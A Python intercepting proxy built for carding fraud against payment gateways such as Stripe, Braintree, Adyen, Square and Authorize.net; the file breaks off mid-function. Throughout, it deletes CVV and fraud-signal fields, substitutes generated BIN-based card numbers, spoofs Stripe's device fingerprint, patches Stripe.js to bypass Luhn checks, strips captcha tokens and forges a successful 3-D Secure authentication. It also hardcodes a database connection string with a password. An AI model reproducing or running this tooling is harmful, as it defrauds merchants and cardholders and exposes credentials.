import base64
import glob
import gzip
import http.client
import http.server
import random
import importlib
import json
import os
import re
import select
import socket
import ssl
import requests
import sys
import datetime
import threading
import time
import urllib.parse
import zlib
from http.client import HTTPMessage
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from subprocess import PIPE, Popen
import socketserver
import hashlib
import io
import brotli
import tempfile
from OpenSSL import crypto
import traceback
import logging
from pymongo import MongoClient

# Set logging level to critical to suppress logs
logging.getLogger('http.server').setLevel(logging.CRITICAL + 1)

# MongoDB connection
userDatabase = MongoClient('mongodb+srv://Mohio:dk@7544mk@mohio.vavm4.mongodb.net/?retryWrites=true&w=majority&appName=Mohio').admin.matrix

# Whitelist for BIN numbers
bin_whitelist = ["Oxxi1337", "Dons"]

def custom_x_www_form_urlencode(data):
    encoded_data = []
    for key, value in data.items():
        if key not in ['guid', 'sid', 'muid', 'key']:
            # Surround key with square brackets if not excluded
            encoded_key = f"[{key}]"
        else:
            encoded_key = key
        encoded_value = value.replace('%40', '@').replace('%3B', ';').replace('%2F', '/').replace('+', '')  # Replace specific encoded characters
        encoded_data.append(f"{encoded_key}={encoded_value}")
    return '&'.join(encoded_data)

def parse_x_www_form_urlencoded(data):
    return dict(urllib.parse.parse_qsl(data))

def deletefromarray(data, key):
    if key in data:
        del data[key]
    return data

def build_x_www_form_urlencoded(data):
    return urllib.parse.urlencode(data)

def checkcc(bin_setting, card_number):
    # Placeholder function to check credit card
    # Implement your logic here
    return True

def gencc(bin_setting):
    # Placeholder function to generate credit card details
    # Implement your logic here
    return ["4111111111111111", "12", "25"]

def parse_application_json(data):
    try:
        return json.loads(data)
    except json.JSONDecodeError:
        return None

def build_application_json(data):
    return json.dumps(data)

def create_and_sign_cert(domain, ca_cert_file, ca_key_file, days=365):
    # Placeholder function to create and sign certificates
    # Implement your logic here
    pass

class ProxyRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

    def do_CONNECT(self):
        self.handle_connect()

    def handle_request(self):
        req_body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        req_path = self.path
        req_headers = self.headers

        # Process the request based on the path
        if "api.stripe.com" in req_path:
            self.stripe_request_handler(req_body)
        elif "pci-api.airwallex.com" in req_path:
            self.airwallex_request_handler(req_body)
        elif "api.xendit.co" in req_path:
            self.xendit_request_handler(req_body)
        elif "pci-connect.squareup.com" in req_path:
            self.square_request_handler(req_body)
        else:
            self.forward_request(req_body)




def request_handler(req, req_body):
	if req.path.split("://", 1)[1].startswith("api.stripe.com"):
		try:
			if b"payment_method_data[card][number]" in req_body:
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV
				parsedbody = deletefromarray(parsedbody, "payment_method_data[card][cvc]")
				
				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "payment_method_data[pasted_fields]")
				parsedbody = deletefromarray(parsedbody, "payment_method_data[payment_user_agent]")
				parsedbody = deletefromarray(parsedbody, "payment_method_data[time_on_page]")

				if parsedbody["payment_method_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["payment_method_data[card][number]"] = parsedbody["payment_method_data[card][number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["payment_method_data[card][number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["payment_method_data[card][number]"] = gennedCC[0]
					parsedbody["payment_method_data[card][exp_month]"] = gennedCC[1]
					parsedbody["payment_method_data[card][exp_year]"] = gennedCC[2]

				req.addToLogs("pink:pink:Stripe Bypass: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
			elif b"card[number]" in req_body:
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV
				parsedbody = deletefromarray(parsedbody, "card[cvc]")

				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "pasted_fields")
				parsedbody = deletefromarray(parsedbody, "payment_user_agent")
				parsedbody = deletefromarray(parsedbody, "time_on_page")

				if parsedbody["card[number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["card[number]"] = parsedbody["card[number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["card[number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["card[number]"] = gennedCC[0]
					parsedbody["card[exp_month]"] = gennedCC[1]
					parsedbody["card[exp_year]"] = gennedCC[2]

				req.addToLogs("pink:pink:Stripe Bypass1: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
			elif b"source_data[card][number]" in req_body:
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV
				parsedbody = deletefromarray(parsedbody, "source_data[card][cvc]")

				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "source_data[pasted_fields]")
				parsedbody = deletefromarray(parsedbody, "source_data[payment_user_agent]")
				parsedbody = deletefromarray(parsedbody, "source_data[time_on_page]")

				if parsedbody["source_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["source_data[card][number]"] = parsedbody["source_data[card][number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["source_data[card][number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["source_data[card][number]"] = gennedCC[0]
					parsedbody["source_data[card][exp_month]"] = gennedCC[1]
					parsedbody["source_data[card][exp_year]"] = gennedCC[2]

				req.addToLogs("pink:pink:Stripe Bypass2: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
		except Exception as e:
			traceback.print_exc()
			pass


	if req.path.split("://", 1)[1].startswith("pci-api.airwallex.com/api/v1/pa/payment_intents"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
				return

			credit_card_info = parsed_body.get("payment_method", {}).get("card", {})

			# Remove CVV from credit card information
			if "cvc" in credit_card_info:
				del credit_card_info["cvc"]

			# Generate card number, expiration month, and year
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			# Update credit card information with generated values
			credit_card_info["number"] = card_number
			credit_card_info["expiry_month"] = exp_month
			credit_card_info["expiry_year"] = exp_year

			req.addToLogs("green:green:airwallex Bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			# Re-encode the modified request body
			req_body = build_application_json(parsed_body).encode()
			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass


	if req.path.split("://", 1)[1].startswith("api.xendit.co/v2/credit_card_tokens"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
				# Log an error message and return
				return

			# Remove CVN
			if "card_data" in parsed_body and "cvn" in parsed_body["card_data"]:
				del parsed_body["card_data"]["cvn"]

			# Remove CVN from card_cvn
			if "card_cvn" in parsed_body:
				del parsed_body["card_cvn"]

			# Generate card number, expiration month, and year
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = int(gennedCC[1])  # Convert expiration month to integer
			exp_year = gennedCC[2]
			
			# Update request data with generated values
			parsed_body["card_data"]["account_number"] = card_number
			parsed_body["card_data"]["exp_month"] = str(exp_month).zfill(2)
			parsed_body["card_data"]["exp_year"] = "20" + str(exp_year)

			req.addToLogs("green:green:Xendit Bypass: " + card_number.replace(" ", "") + "|" + str(exp_month) + "|" + str(exp_year))

			req_body = build_application_json(parsed_body).encode()
			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass


	

	if req.path.split("://", 1)[1].startswith("pci-connect.squareup.com"):
		try:
			parsed_body = parse_application_json(req_body.decode("utf-8"))

			if parsed_body is None:
				return

			# Check if "card_data" key exists
			if "card_data" in parsed_body:
				# Remove CVV from the parsed body if present
				if "cvv" in parsed_body["card_data"]:
					del parsed_body["card_data"]["cvv"]

				# Generate new credit card information
				gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
				card_number = gennedCC[0]
				exp_month = int(gennedCC[1])
				exp_year = int("20" + gennedCC[2])

				# Update parsed body with the new credit card details
				parsed_body["card_data"]["number"] =card_number
				parsed_body["card_data"]["exp_month"] =exp_month
				parsed_body["card_data"]["exp_year"] =exp_year

				# Log the modified card details
				req.addToLogs("green:green:Squareup Bypass: " + card_number.replace(" ", "") + "|" + str(exp_month) + "|" + str(exp_year))

				# Re-encode the modified request body
				req_body = build_application_json(parsed_body).encode()

				print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass


	if req.path.split("://", 1)[1].startswith("checkoutshopper-live.adyen.com"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
				# Log an error message and return
				return
			
			# Remove CVV if present
			if "encryptedSecurityCode" in parsed_body['paymentMethod']:
				del parsed_body['paymentMethod']['encryptedSecurityCode']
			
			# Update request data with generated values
				gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
				card_number = gennedCC[0]
				exp_month = gennedCC[1]
				exp_year = gennedCC[2]

				# parsed_body['paymentMethod']["encryptedCardNumber"] = card_number
				# parsed_body['paymentMethod']["encryptedExpiryMonth"] = exp_month
				# parsed_body['paymentMethod']["encryptedExpiryYear"] = exp_year
				
				req.addToLogs("green:green:Adyen Bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)
				req_body = build_application_json(parsed_body).encode()
				print(req_body)
		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	if req.path.split("://", 1)[1].startswith("api.securepay.com"):
		try:
			parsed_body = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

			if parsed_body is None:
				return

			if "EPS_CCV" in parsed_body:
				del parsed_body["EPS_CCV"]
				del parsed_body["EPS_IP"]


			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			parsed_body["EPS_CARDNUMBER"] = card_number
			parsed_body["EPS_EXPIRYMONTH"] = str(int(exp_month)).zfill(2)  # Ensure month is two digits
			parsed_body["EPS_EXPIRYYEAR"] = "20" + str(exp_year)  # Adding '20' to the year

			req_body = build_x_www_form_urlencoded(parsed_body).encode()

			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass



	if req.path.split("://", 1)[1].startswith("ps1.ncrsecurepay.com"):
		try:
			parsed_body = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

			if parsed_body is None:
				return

			if "cv" in parsed_body:
				del parsed_body["cv"]

			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			parsed_body["account"] = card_number
			parsed_body["expdate"] = exp_month + exp_year[2:]  # Combining month and year
			parsed_body["monetra_req_fields"] = "account,expdate"

			req.addToLogs("green:green:Ncrsecurepay Bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			req_body = build_x_www_form_urlencoded(parsed_body).encode()

			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass
		

	if req.path.split("://", 1)[1].startswith("api.processout.com"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
				# Log an error message and return
				return

			# Remove CVV from the parsed body if present
			if "cvc2" in parsed_body:
				del parsed_body["cvc2"]

			# Generate new credit card information
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			# Update parsed body with the new credit card details
			parsed_body["number"] = card_number
			parsed_body["month"] = exp_month
			parsed_body["year"] = exp_year

			# Log the modified card details
			req.addToLogs("green:green:Processout Bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			# Re-encode the modified request body
			req_body = build_application_json(parsed_body).encode()

			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	if req.path.split("://", 1)[1].startswith("www.computop-paygate.com"):
		try:
			parsed_body = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

			if parsed_body is None:
				return

			if "cccvc" in parsed_body:
				del parsed_body["cccvc"]

			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			parsed_body["KKnr"] = card_number
			parsed_body["KKMonth"] = exp_month
			parsed_body["KKYear"] = exp_year

			req.addToLogs("green:green:Paygate Bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			req_body = build_x_www_form_urlencoded(parsed_body).encode()

			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass


	if req.path.split("://", 1)[1].startswith("api.recurly.com/js/v1/token"):
		try:
			parsed_body = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

			if parsed_body is None:
				return

			# Remove CVV from the parsed body if present
			if "cvv" in parsed_body:
				del parsed_body["cvv"]

			# Generate new credit card information
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			# Update parsed body with the new credit card details
			parsed_body["number"] = card_number
			parsed_body["month"] = exp_month
			parsed_body["year"] = exp_year

			# Log the modified card details
			req.addToLogs("green:green:Recurly Bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			# Re-encode the modified request body
			req_body = build_x_www_form_urlencoded(parsed_body).encode()

			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	
		
	if req.path.split("://", 1)[1].startswith("api2.authorize.net"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
            # Log an error message and return
				return

			# Remove CVV
			if 'securePaymentContainerRequest' in parsed_body and 'data' in parsed_body['securePaymentContainerRequest'] and 'token' in parsed_body['securePaymentContainerRequest']['data']:
				token_data = parsed_body['securePaymentContainerRequest']['data']['token']
				if "cardCode" in token_data:
					del token_data["cardCode"]  # Remove CVV

			# Generate card number, expiration month, and year
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

				# Update request data with generated values
			parsed_body['securePaymentContainerRequest']['data']['token']["cardNumber"] = card_number
			parsed_body['securePaymentContainerRequest']['data']['token']["expirationDate"] = exp_month + exp_year

			req.addToLogs("green:green:Authorize bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)
			req_body = build_application_json(parsed_body).encode()
			print(req_body)

		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	


	if req.path.split("://", 1)[1].startswith("payments.braintree-api.com"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
            # Log an error message and return
				return
			# Remove CVV
			if "cvv" in parsed_body['variables']['input']['creditCard']:
				del parsed_body['variables']['input']['creditCard']['cvv']

			# Generate card number, expiration month, and year
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			# Update request data with generated values
			parsed_body['variables']['input']['creditCard']["number"] = card_number
			parsed_body['variables']['input']['creditCard']["expirationMonth"] = exp_month
			parsed_body['variables']['input']['creditCard']["expirationYear"] = exp_year
			
			req.addToLogs("green:green:Braintree bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)
			req_body = build_application_json(parsed_body).encode()
			print(req_body)
		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	
		
	

	if req.path.split("://", 1)[1].startswith("www1.bluesnap.com"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
            # Log an error message and return
				return
			# Remove CVV
			if "cvv" in parsed_body:
				del parsed_body["cvv"]

			# Generate card number, expiration month, and year
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			# Update request data with generated values
			parsed_body["ccNumber"] = card_number
			parsed_body["expDate"] = exp_month
			parsed_body["expDate"] = exp_year

			req.addToLogs("green:green:bluesnap bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			req_body = build_application_json(parsed_body).encode()
			print(req_body)
		
		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	
		
	

	if req.path.split("://", 1)[1].startswith("api.checkout.com") and req.path.endswith("/tokens"):
		try:
			req_body_decoded = req_body.decode("utf-8")
			parsed_body = parse_application_json(req_body_decoded)

			if parsed_body is None:
            # Log an error message and return
				return
			# Remove CVV
			if "cvv" in parsed_body:
				del parsed_body["cvv"]

			# Generate card number, expiration month, and year
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			card_number = gennedCC[0]
			exp_month = gennedCC[1]
			exp_year = gennedCC[2]

			# Update request data with generated values
			parsed_body["number"] = card_number
			parsed_body["expiry_month"] = exp_month
			parsed_body["expiry_year"] = exp_year

			req.addToLogs("green:green:Checkout bypass: " + card_number.replace(" ", "") + "|" + exp_month + "|" + exp_year)

			req_body = build_application_json(parsed_body).encode()
			print(req_body)
		
		except Exception as e:
			import traceback
			traceback.print_exc()
			pass

	try:
		if req.path.split("://", 1)[1].startswith("m.stripe.com"):
			#Fingerprint randomization
			old_req = req_body
			payload = json.loads(urllib.parse.unquote_plus(base64.b64decode(req_body).decode()))

			if payload.get("h", False) != False:
				start_time = random.randint(5000, 20000)

				payload["t"] = start_time
				payload["a"] = {
					"a": {
						"v": "true", #Don't know, probably always true
						"t": random.randint(1,9)/10
					},
					"b": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(1,9)/10
					},
					"c": {
						"v": "en-US", #Browser language
						"t": random.randint(1,9)/10
					},
					"d": {
						"v": "Win32", #OS Version
						"t": random.randint(1,9)/10
					},
					"e": {
						"v": "PDF Viewer,internal-pdf-viewer", #Printer extensions
						"t": random.randint(1,9)/10
					},
					"f": {
						"v": "1920w_1040h_24d_1r", #Display settings
						"t": random.randint(1,9)/10
					},
					"g": {
						"v": "2", #Don't know, probably always 2
						"t": random.randint(1,9)/10
					},
					"h": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(1,9)/10
					},
					"i": {
						"v": "sessionStorage-enabled, localStorage-enabled", #Get eyes
						"t": random.randint(50,100)/10
					},
					"j": {
						"v": "1111111111111111111111111111111111111111111111111111111", # What fonts you have, represented in 1s or 0s, it checks for these fonts: [["Andale Mono", "mono"], ["Arial Black", "sans"], ["Arial Hebrew", "sans"], ["Arial MT", "sans"], ["Arial Narrow", "sans"], ["Arial Rounded MT Bold", "sans"], ["Arial Unicode MS", "sans"], ["Arial", "sans"], ["Bitstream Vera Sans Mono", "mono"], ["Book Antiqua", "serif"], ["Bookman Old Style", "serif"], ["Calibri", "sans"], ["Cambria", "serif"], ["Century Gothic", "serif"], ["Century Schoolbook", "serif"], ["Century", "serif"], ["Comic Sans MS", "sans"], ["Comic Sans", "sans"], ["Consolas", "mono"], ["Courier New", "mono"], ["Courier", "mono"], ["Garamond", "serif"], ["Georgia", "serif"], ["Helvetica Neue", "sans"], ["Helvetica", "sans"], ["Impact", "sans"], ["Lucida Fax", "serif"], ["Lucida Handwriting", "script"], ["Lucida Sans Typewriter", "mono"], ["Lucida Sans Unicode", "sans"], ["Lucida Sans", "sans"], ["MS Gothic", "sans"], ["MS Outlook", "symbol"], ["MS PGothic", "sans"], ["MS Reference Sans Serif", "sans"], ["MS Serif", "serif"], ["MYRIAD PRO", "sans"], ["MYRIAD", "sans"], ["Microsoft Sans Serif", "sans"], ["Monaco", "sans"], ["Monotype Corsiva", "script"], ["Palatino Linotype", "serif"], ["Palatino", "serif"], ["Segoe Script", "script"], ["Segoe UI Semibold", "sans"], ["Segoe UI Symbol", "symbol"], ["Segoe UI", "sans"], ["Tahoma", "sans"], ["Times New Roman PS", "serif"], ["Times New Roman", "serif"], ["Times", "serif"], ["Trebuchet MS", "sans"], ["Verdana", "sans"], ["Wingdings 3", "symbol"], ["Wingdings", "symbol"]]
						"t": start_time-random.randint(50,200),
						"at": random.randint(15000,20000)/10
					},
					"k": {
						"v": "", #Don't know, its blank lol
						"t": random.randint(1,9)/10
					},
					"l": {
						"v": req.headers["User-Agent"], #Client's user agent
						"t": random.randint(1,9)/10
					},
					"m": {
						"v": "", #Don't know, its blank lol
						"t": random.randint(1,9)/10
					},
					"n": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(15000,20000)/10
					},
					"o": {
						"v": hashlib.md5(os.urandom(128)).hexdigest(), #Canvas encoded to md5, who says it has to be a canvas tho :troll_face:
						"t": random.randint(1,9)/10
					},
				}


			req_body = base64.b64encode(urllib.parse.quote(json.dumps(payload, separators=(',', ':')), safe='').encode())
	except Exception as e:
		traceback.print_exc()

	return req_body

def response_handler(req, req_body, res, res_body):
	if req.path.split("://", 1)[1].startswith("js.stripe.com"):
		#Luhn check bypass
		pattern = re.compile(b'return [a-zA-Z0-9]%10==0')
		res_body = pattern.sub(b'return true', res_body)
		res_body = res_body.replace(b'return u(r,i,n)', b'return null')

		stripejsuuid = b"//# sourceMappingURL=https://js.stripe.com/v3/sourcemaps/stripe-"
		if res_body.endswith(b".js.map") and stripejsuuid in res_body.split(b"\n", 1)[1]:
			#Fingerprint bypass
			res_body = res_body.replace(b"Mo:function(){return d},Ye:function(){return p}", b"Mo:function(){return false},Ye:function(){return false}")

			if isWin():
				sdf = open("static\\stripedetected.js", "rb")
			else:
				sdf = open("static/stripedetected.js", "rb")
			sd = sdf.read().replace(b"STRIPEVERSIONHERE", res_body.split(b",version:\"", 1)[1].split(b"\"", 1)[0])
			res_body = res_body+b"\r\n"+sd
			sdf.close()

	try:
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("yellow:yellow:CARD DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("yellow:yellow:CARD DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:Bypass Done')
			
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_intents/") and not req.path.split("://", 1)[1].endswith("verify_challenge"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("yellow:yellow:CARD DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("yellow:yellow:CARD DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'succeeded' in res_body:
				req.addToLogs('green:lime:Bypass Done')
		
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/checkout/sessions/completed_webhook_delivered/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("yellow:yellow:CARD DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("yellow:yellow:CARD DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:Bypass Done')
	except Exception as e:
		traceback.print_exc()
		pass

	
			
	if req.path.split("://", 1)[1].startswith("billing.stripe.com"):
		try:
			parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))
			parsedbody = deletefromarray(parsedbody, "radar_options[hcaptcha_token]")
			parsedbody = deletefromarray(parsedbody, "passive_captcha_token")
			parsedbody = deletefromarray(parsedbody, "passive_captcha_ekey")
			req_body = build_x_www_form_urlencoded(parsedbody).encode()

		except Exception as e:
			print(e)


	if req.path.split("://", 1)[1].startswith("api.stripe.com") and req.path.endswith("/v1/3ds2/authenticate"):
		try:
			req_body = req_body.decode("utf-8")
			if "one_click_authn_device_support[hosted]" in req_body:
				# Here we have the authorization request, we are going to swap out the response with a success one

				challengeHeaders = req.headers
				del challengeHeaders["Content-Length"]

				challengeData = parse_x_www_form_urlencoded(req_body)
				del challengeData["one_click_authn_device_support[hosted]"]
				del challengeData["one_click_authn_device_support[same_origin_frame]"]
				del challengeData["one_click_authn_device_support[spc_eligible]"]
				del challengeData["one_click_authn_device_support[webauthn_eligible]"]
				del challengeData["one_click_authn_device_support[publickey_credentials_get_allowed]"]
				del challengeData["browser"]
				challengeData = build_x_www_form_urlencoded(challengeData)
				jresbody = json.loads(res_body.decode("utf-8"))

				payload = {
					"messageType":"CRes",
					"messageVersion":"2.1.0",
					"threeDSServerTransID":jresbody["ares"]["threeDSServerTransID"],
					"acsTransID":jresbody["ares"]["acsTransID"],
					"transStatus":"Y"
				}

				stringedpayload=json.dumps(payload, separators=(',', ':'))

				challengeData+= "&final_cres="+urllib.parse.quote_plus(stringedpayload)

				res_body = requests.post("https://api.stripe.com/v1/3ds2/challenge_complete", proxies=req.getFormattedProxy(), headers=challengeHeaders, data=challengeData).text.encode("utf-8")
		except Exception as e:
			traceback.print_exc()

		req_body = req_body.encode("utf-8")

	return res_body

def isWin():
	return (True if os.name == 'nt' else False)

def deletefromarray(array, element):
	try:
		del array[element]
	except:
		pass
	return array



def parse_x_www_form_urlencoded(data):
    result = {}
    for item in data.split('&'):
        parts = item.split('=')
        if len(parts) == 2:
            key, value = parts
            result[key] = value.replace('+', ' ').replace('%20', ' ')
    return result

def parse_application_json(data):
    try:
        parsed_data = json.loads(data)
        return parsed_data
    except json.JSONDecodeError as e:
        print("Error parsing JSON:", e)
        return None

def build_x_www_form_urlencoded(data):
	result = []
	for key, value in data.items():
		value = value.replace(' ', '+')
		result.append(f"{key}={value}")
	return '&'.join(result)


def build_application_json(data):
    try:
        json_data = json.dumps(data)
        return json_data
    except TypeError as e:
        print("Error building JSON:", e)
        return None


def gencc(U):
	while True:
		if len(U)<16:U=U+'x'
		else:break
	def C(L):
		def B(n):return[int(A)for A in str(n)]
		C=B(L);D=C[-1::-2];E=C[-2::-2];A=0;A+=sum(D)
		for F in E:A+=sum(B(F*2))
		return A%10
	def D(x,t):
		def G(aS,n):
			aS=str(aS)
			if n>=1:A=aS[-n:]
			else:A=''
			return A
		def C(aS,n,n2=None):
			A=n2;aS=str(aS)
			if A is None or A=='':A=len(aS)
			n,A=int(n),int(A)
			if n<0:n+=1
			B=aS[n-1:n-1+A];return B
		def B(x,t=1):
			x=str(x)
			if t>0:
				while len(x)>t:A=sum([int(x[A])for A in range(len(x))]);x=str(A)
			else:
				for B in range(abs(t)):A=sum([int(x[A])for A in range(len(x))]);x=str(A)
			return int(x)
		D=False;E='';A=1
		for H in range(1,len(x)):
			I=int(C(x,H,1))*int(C('21',A,1));E+=str(B(I));A+=1
			if A>len('21'):A=1
		F=B(E,-1)
		if(10*B(F,-1)-F)%10==int(G(x,1)):D=True
		return D
	while True:
		A=''
		for B in U:
			if len(A)<16 and'x'==B.lower():A+=str(random.randint(0,9))
			else:A+=str(B)
		if C(A)==0 and D(A,random.randint(0,9)):return A,str(random.choice(list(range(1,13)))).zfill(2),str(random.choice(list(range(datetime.date.today().year+1,datetime.date.today().year+8))))[-2:],str(random.randrange(1000)).zfill(3)


def checkcc(A,C):
	if A=="":return True
	while True:
		if len(A)<16:A=A+'x'
		else:break
	if len(A)!=len(C):return False
	for B in range(len(A)):
		if A[B]!='x'and A[B]!=C[B]:return False
	return True

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
	address_family = socket.AF_INET6
	daemon_threads = True

	def handle_error(self, request, client_address):
		# surpress socket/ssl related errors
		cls, e = sys.exc_info()[:2]
		if cls is socket.error or cls is ssl.SSLError:
			pass
		else:
			return HTTPServer.handle_error(self, request, client_address)


class ProxyRequestHandler(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		pass

	def handle(self):
		try:
			super().handle()
		except Exception as e:
			logging.debug("Exception in ProxyRequestHandler: %s", e)

	def do_CONNECT(self):
		host, _ = self.path.split(":", 1)
		self.ishttps = True
		self.hostname = host

		if not self.isAuthorized() and self.hostname != "matrix":
			self.connect_intercept()
			return

		blacklisted_domains = ["r.stripe.com", "geoissuer.cardinalcommerce.com"]
		allowed_domains = ["api.stripe.com", "js.stripe.com", "m.stripe.com", "matrix", "securepay.svcs.endurance.com", "payments.braintree-api.com", "api.processout.com", "api.checkout.com", "api2.authorize.net", "secure.upgate.com", "www.computop-paygate.com", "api.recurly.com", "pci-api.airwallex.com", "checkout-service.paddle.com", "www.paypal.com", "paypal.com", "computop-paygate.com", "api.xendit.co", "pci-connect.squareup.com", "checkoutshopper-live.adyen.com", "ps1.ncrsecurepay.com", "api.securepay.com", "api.securepay.com.au", "lev.paytrace.com", "api.razorpay.com", "lumberjack-cx.razorpay.com", "razorpay.com"]
		try:
			if self.hostname in blacklisted_domains:
